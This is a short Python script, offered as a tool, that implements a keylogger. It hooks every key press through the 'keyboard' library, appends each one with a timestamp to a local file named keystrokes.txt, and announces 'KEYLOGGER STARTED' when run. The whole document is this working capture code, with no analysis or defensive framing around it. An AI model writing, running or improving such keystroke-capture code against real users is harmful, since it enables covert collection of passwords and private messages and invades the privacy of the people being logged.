import keyboard
import datetime
import os

log_file = 'keystrokes.txt'

def on_key_press(event):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
    with open(log_file, 'a') as f:
        f.write(f'{timestamp} - {event.name}\n')

keyboard.on_press(on_key_press)

print(f'\n\nKEYLOGGER STARTED... \nLogging to {os.path.abspath(log_file)} \nQuit by clicking ctrl + C')
keyboard.wait()